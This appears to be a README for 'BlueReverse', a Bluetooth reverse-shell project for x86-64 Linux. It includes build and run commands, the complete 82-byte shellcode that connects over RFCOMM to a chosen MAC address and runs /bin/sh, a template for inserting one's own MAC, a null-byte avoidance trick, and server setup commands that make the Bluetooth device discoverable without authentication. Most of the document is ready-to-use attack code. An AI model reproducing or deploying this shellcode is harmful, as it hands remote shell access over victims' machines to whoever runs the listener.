---

BlueReverse has been implemented as personal research and fun. I provide you .asm file (client side), .py 2.7 file (server side) and the shellcode.

You must fill .asm and .py with your mac and with your desired channel for the communication. Then:
```
nasm -f elf64 brev_shell.asm -o test.o
ld test.o -o test
```

Now you must start the server:
```
python bluereversehandler.py
```

And now you can launch test:
```
./test
```
You will get prompt on server side.
I tested the code with a rpi3 (server) and a Debian Stretch (client).

---

### Shellcode:

If you need shellcode you can use my tool ShellcodeExtractor (https://github.com/Neetx/Shellcode-Extractor)

```
objdump -D test.o | python shellcode_extractor.py
```

My output and lenght:
```
\x6a\x29\x58\x6a\x01\x5e\x6a\x1f\x5f\x6a\x03\x5a\x0f\x05\x97\x6a\x02\x66\x5e\xb0\x21\x0f\x05\x83\xee\x01\x79\xf7\x48\x31\xc9\xb1\x03\x51\x48\xb9\xe0\xff\x9f\xea\xa3\x14\xd8\x47\x48\xf7\xd1\x51\x54\x5e\xb2\x0a\x48\x31\xc0\xb0\x2a\x0f\x05\x48\x31\xd2\x52\x5e\x52\x48\xb9\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x51\x54\x5f\xb0\x3b\x0f\x05
82
```

You must do it by yourself because you have another MAC and maybe another channel.
If you don't use my tool or another tool/command you have to put your MAC manually after NOT operation, because of this in .asm:
```
mov rcx, ~0xXXXXXXXXXXXX001f		;mac + family(1f=31)
not rcx
```
(~ MAC + 00 (filler) + 1f (family))

00 is a nullbyte and to avoid it I use ~ , so the value after ~ is stored in the binary after a NOT operation and 00 become FF. Then i used "not rcx" to obtain the desired value.

Put your bluetooth MAC address here instead of \xXX\xXX\xXX\xXX\xXX\xXX, in little endian and after NOT operation:

```
\x6a\x29\x58\x6a\x01\x5e\x6a\x1f\x5f\x6a\x03\x5a\x0f\x05\x97\x6a\x02\x66\x5e\xb0\x21\x0f\x05\x83\xee\x01\x79\xf7\x48\x31\xc9\xb1\x03\x51\x48\xb9\xe0\xff\xXX\xXX\xXX\xXX\xXX\xXX\x48\xf7\xd1\x51\x54\x5e\xb2\x0a\x48\x31\xc0\xb0\x2a\x0f\x05\x48\x31\xd2\x52\x5e\x52\x48\xb9\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x51\x54\x5f\xb0\x3b\x0f\x05
```

### Shellcode Generator
Instead of the previous steps you can use my generator.py (python >= 3.7) to get the shellcode
```
python generator.py MAC CHANNEL
```

### Test Shellcode:

Put your shellcode in the shellcode_tester.c, compile it and test. 

---

### Server Side
On the server side you should adapt and use bluereversehandler.py

```
sudo hciconfig <device> piscan   
sudo hciconfig <device> noauth   
python2 bluereversehandler.py
``` 

An handler update will be released asap.
